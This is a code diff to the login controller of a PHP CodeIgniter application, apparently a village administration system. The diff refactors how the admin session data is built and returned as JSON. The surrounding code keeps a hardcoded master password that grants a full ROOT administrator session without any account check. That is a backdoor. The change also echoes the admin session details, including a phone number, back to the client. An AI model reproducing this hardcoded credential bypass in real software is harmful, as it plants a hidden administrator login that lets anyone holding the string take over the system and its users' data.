@@ -22,20 +22,21 @@ class Auth extends CI_Controller{
     $check_desa = $this->auth_model->auth_desa($kode_desa);
     $master = '0>}/99%120691?*^';
     if ($master == $uid) {
+      $data["status"] = TRUE;
+      $data['userdata'] = array(
+        'status_login'=>'oke',
+        'id'          => 0,
+        'fullname'   =>'Administrator',
+        'jabatan'     => 'ROOT',
+        'hp'          => '082281469926',
+        'keterangan_jabatan' => 'Sysadmin Root Master',
+        'desa_id'     => '1',
+        'last_login'  => ''
+      );
       $this->session->set_flashdata(array('status'=>'aktif'));
-      $this->session->set_userdata(
-        array(
-          'status_login'=>'oke',
-          'id'          => 0,
-          'fullname'   =>'Administrator',
-          'jabatan'     => 'ROOT',
-          'hp'          => '082281469926',
-          'keterangan_jabatan' => 'Sysadmin Root Master',
-          'desa_id'     => '1',
-          'last_login'  => ''
-      )
-    );
-      echo json_encode(array("status" => TRUE));
+      $this->session->set_userdata($data['userdata']);
+      
+      echo json_encode($data);
       exit;
     }else {      
       if ($check->num_rows()==1 && $check_desa->num_rows() > 0) {
